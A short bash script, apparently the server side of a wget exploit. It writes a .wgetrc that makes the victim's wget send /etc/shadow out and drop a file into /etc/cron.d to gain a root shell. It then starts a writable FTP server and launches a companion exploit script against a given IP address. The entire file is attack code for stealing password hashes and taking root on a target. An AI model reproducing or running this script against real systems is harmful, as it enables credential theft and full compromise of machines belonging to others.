#!/bin/bash

#This scrip is to run on the server side of the wget exploit.
#We assume one knows the system's IP address as an input

#usage: ./wgettest_server.sh <IP_address>

sudo cat <<_EOF_>.wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
_EOF_

sudo pip install pyftpdlib
sudo python -m pyftpdlib -p21 -w &

sudo python ./wget-exploit.py $1
